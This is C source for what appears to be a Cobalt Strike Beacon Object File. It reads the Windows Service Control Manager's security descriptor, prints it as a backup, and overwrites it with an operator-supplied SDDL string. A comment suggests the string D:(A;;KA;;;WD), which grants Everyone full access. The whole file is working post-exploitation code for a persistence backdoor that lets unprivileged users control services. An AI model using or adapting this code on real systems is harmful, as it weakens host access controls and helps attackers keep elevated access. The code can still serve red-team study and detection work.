#include <windows.h>
#include "beacon.h"
#define SDDL_REVISION_1 1

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$QueryServiceObjectSecurity(SC_HANDLE, SECURITY_INFORMATION, PSECURITY_DESCRIPTOR, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertSecurityDescriptorToStringSecurityDescriptorA(PSECURITY_DESCRIPTOR, DWORD, SECURITY_INFORMATION, LPSTR*, PULONG);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(LPCSTR, DWORD, PSECURITY_DESCRIPTOR, PULONG);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$SetServiceObjectSecurity(SC_HANDLE, SECURITY_INFORMATION, PSECURITY_DESCRIPTOR);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);

// Inspired by @0gtweet: https://twitter.com/0gtweet/status/1628720819537936386
VOID go(char* args, int alen) {
    datap parser;
    char* pSDDL;

    BeaconDataParse(&parser, args, alen);
    pSDDL = BeaconDataExtract(&parser, NULL);

    HANDLE hToken = NULL;
    if(!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        BeaconPrintf(CALLBACK_OUTPUT, "ADVAPI32$OpenProcessToken failed: %ld\n", KERNEL32$GetLastError());
        return;
    }

    if(!ADVAPI32$ImpersonateLoggedOnUser(hToken)) {
        BeaconPrintf(CALLBACK_OUTPUT, "ADVAPI32$ImpersonateLoggedOnUser failed: %ld\n", KERNEL32$GetLastError());
        return;
    }

    SC_HANDLE scManager = NULL;
    if (!(scManager = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS))) {
        BeaconPrintf(CALLBACK_OUTPUT, "ADVAPI32$OpenSCManager failed: %ld\n", KERNEL32$GetLastError());
        return;
    }

    PSECURITY_DESCRIPTOR pSecurityDescriptor = NULL;
    DWORD dwBytesNeeded = 0;
    if (!ADVAPI32$QueryServiceObjectSecurity(scManager, DACL_SECURITY_INFORMATION, pSecurityDescriptor, 0, &dwBytesNeeded) && KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        if (!(pSecurityDescriptor = (PSECURITY_DESCRIPTOR)KERNEL32$LocalAlloc(LPTR, dwBytesNeeded))) {
            BeaconPrintf(CALLBACK_OUTPUT, "KERNEL32$LocalAlloc failed: %ld\n", KERNEL32$GetLastError());
            ADVAPI32$CloseServiceHandle(scManager);
            return;
        }

        if (!ADVAPI32$QueryServiceObjectSecurity(scManager, DACL_SECURITY_INFORMATION, pSecurityDescriptor, dwBytesNeeded, &dwBytesNeeded)) {
            BeaconPrintf(CALLBACK_OUTPUT, "ADVAPI32$QueryServiceObjectSecurity (actual sd) failed: %ld\n", KERNEL32$GetLastError());
            KERNEL32$LocalFree(pSecurityDescriptor);
            ADVAPI32$CloseServiceHandle(scManager);
            return;
        }
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "ADVAPI32$QueryServiceObjectSecurity (sd size) failed: %ld\n", KERNEL32$GetLastError());
        return;
    }

    LPSTR pStringSecurityDescriptor = NULL;
    if (!ADVAPI32$ConvertSecurityDescriptorToStringSecurityDescriptorA(pSecurityDescriptor, SDDL_REVISION_1, DACL_SECURITY_INFORMATION, &pStringSecurityDescriptor, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "ADVAPI32$ConvertSecurityDescriptorToStringSecurityDescriptorA failed: %ld\n", KERNEL32$GetLastError());
        KERNEL32$LocalFree(pSecurityDescriptor);
        ADVAPI32$CloseServiceHandle(scManager);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Current SDDL to backup:\n%s\n", pStringSecurityDescriptor);

    KERNEL32$LocalFree(pSecurityDescriptor);
    KERNEL32$LocalFree(pStringSecurityDescriptor);

    pSecurityDescriptor = NULL;
    if (!ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(pSDDL, SDDL_REVISION_1, &pSecurityDescriptor, NULL)) {
        // D:(A;;KA;;;WD) is SDDL_EVERYONE -> SDDL_KEY_ALL
        BeaconPrintf(CALLBACK_OUTPUT, "ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA failed: %ld\n", KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(scManager);
        return;
    }

    if (!ADVAPI32$SetServiceObjectSecurity(scManager, DACL_SECURITY_INFORMATION, pSecurityDescriptor)) {
        BeaconPrintf(CALLBACK_OUTPUT, "ADVAPI32$SetServiceObjectSecurity failed: %ld\n", KERNEL32$GetLastError());
        KERNEL32$LocalFree(pSecurityDescriptor);
        ADVAPI32$CloseServiceHandle(scManager);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Done, SCManager SDDL was successfully changed!\n");

    KERNEL32$LocalFree(pSecurityDescriptor);
    ADVAPI32$CloseServiceHandle(scManager);

    return;
}
